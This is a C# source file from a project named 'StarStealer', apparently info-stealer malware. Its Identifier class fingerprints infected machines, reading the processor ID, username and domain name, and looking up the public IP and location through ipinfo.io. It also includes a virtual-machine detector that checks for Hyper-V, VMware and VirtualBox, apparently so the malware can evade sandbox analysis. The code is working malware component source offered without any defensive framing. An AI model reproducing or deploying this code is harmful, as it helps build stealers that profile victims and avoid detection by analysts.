using System;
using System.IO;
using System.Management;
using System.Net;
using System.Web.Script.Serialization;
using StarStealer.Models;

namespace StarStealer.Utilities
{
    class Identifier
    {
        private static string GetHwid()
        {
            try
            {
                var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                ManagementObjectCollection mbsList = mbs.Get();
                foreach (ManagementObject mo in mbsList)
                {
                    return mo["ProcessorId"].ToString();
                }
                return "";
            }
            catch
            {
                return "";
            }
        }
        private static void GetGeo(ref User user)
        {
            try
            {
                WebRequest Request = WebRequest.CreateHttp(@"https://ipinfo.io/json");
                Request.Credentials = CredentialCache.DefaultCredentials;
                WebResponse Response = Request.GetResponse();
                Stream DataStream = Response.GetResponseStream();
                StreamReader DataStreamReader = new StreamReader(DataStream);
                String Data = DataStreamReader.ReadToEnd();
                DataStreamReader.Close();
                Response.Close();
                var JsonConvert = new JavaScriptSerializer();
                var info = JsonConvert.Deserialize<IpInfo>(Data);
                user.IP = info.ip;
                user.GeoLocation = $"{info.country}";
                if (!String.IsNullOrEmpty(info.city))
                    user.GeoLocation += $" | {info.city}";
                if (!String.IsNullOrEmpty(info.region))
                    user.GeoLocation += $", {info.region}";
            }
            catch
            {

            }
        }
        public struct IpInfo
        {
            public string ip { get; set; }
            public string country { get; set; }
            public string region { get; set; }
            public string city { get; set; }
            public string loc { get; set; }
            public string org { get; set; }
        }
        public static void GetInfo(ref User user)
        {
            user.Hwid = GetHwid();
            user.UserName = Environment.UserName;
            user.PCName = Environment.UserDomainName;
            user.Date = DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString();
            GetGeo(ref user);
        }
        public static bool VMDetector()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }
    }
}
